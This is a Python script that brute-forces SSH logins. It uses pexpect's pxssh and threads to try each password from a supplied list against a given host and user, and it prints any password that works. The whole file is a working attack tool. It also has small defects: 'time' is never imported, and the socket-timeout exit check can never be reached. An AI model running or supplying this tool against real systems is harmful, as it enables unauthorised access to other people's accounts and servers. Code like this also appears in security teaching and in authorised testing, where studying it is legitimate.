#Pxssh interacts with SSH sessions with pre-defined methods

import optparse
from threading import *
from pexpect import pxssh

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)    #ensures only we can close connection
Fails = 0
Found = False     # Global boolean flag to set if password is found

#Attempts SSH connection for password from list and tries connect() if prompt error
#use release so that connect() can call connect().
def connect(host, user, password, release):
  global Found
  global Fails
  try:
    s = pxssh.pxssh()
    s.login(host, user, password)
    print('[+] Password found: '+password)
    Found = True
  except Exception as e:
    #SSH server maxed out on number of connections
    if 'read_nonblocking' in str(e):
      Fails += 1
      #if pxssh is having difficulty obtaining a command prompt, sleep for a second
      time.sleep(5)
      connect(host, user, password, False)  #trying again
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host, user, password, False)
  finally:
    #semaphore internal counter increases by release()
    if release: connection_lock.release()   #close connection  

def main():
  parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
  parser.add_option('-H', dest='tgtHost',type='string', help='Specify target host')
  parser.add_option('-u', dest='user', type='string', help='Specify the user')
  parser.add_option('-F', dest='passwdFile', type='string', help='Specify password file')
  (options, args) = parser.parse_args()
  host = options.tgtHost
  user = options.user
  passwdFile = options.passwdFile
  if host == None or passwdFile == None or user == None:
    print(parser.usage)
    exit(0)
  fn = open(passwdFile,'r')
  for line in fn.readlines():
    if Found:
      print('[+] Exiting: Password found')
      exit(0)
      if Fails > 5:
        print('[!] Exiting: Too many socket timeouts')
        exit(0)
    
    #Semaphore block until it is unlocked by release()
    connection_lock.acquire()
    #Strip carriage return and then, new line
    password = line.strip('\r').strip('\n')
    print("[-] Testing: "+str(password))
    t = Thread(target=connect, args=(host, user, password, True))
    child = t.start()

if __name__ == '__main__':
  main()